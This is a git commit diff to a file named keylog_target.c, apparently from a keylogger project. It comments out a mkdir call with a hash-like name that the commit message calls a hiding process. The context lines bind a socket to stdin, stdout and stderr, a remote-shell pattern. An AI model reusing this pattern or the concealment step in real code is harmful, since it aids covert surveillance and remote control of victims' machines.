53b5704d71aa038a11d1066d08fd2e4acb53794a
Wesley Hamburger <wezham1@gmail.com>
2019-08-11 11:18:13 +1000

    remove hiding process

--- src/bin/keylog_target.c
+++ src/bin/keylog_target.c
@@ -44,7 +44,7 @@ int main(int argc, char** argv)
 		dup2(sock, 0); //stdin
 		dup2(sock, 1); //stdout
 		dup2(sock, 2); //stderr
-		mkdir("7C937ED6E719132F7E27E837F5024DDA1A23919287D662349E3E17367B37D85C", S_IRWXU);
+		//mkdir("7C937ED6E719132F7E27E837F5024DDA1A23919287D662349E3E17367B37D85C", S_IRWXU);
 		read_and_write(sock);
 	}
 	return 1;
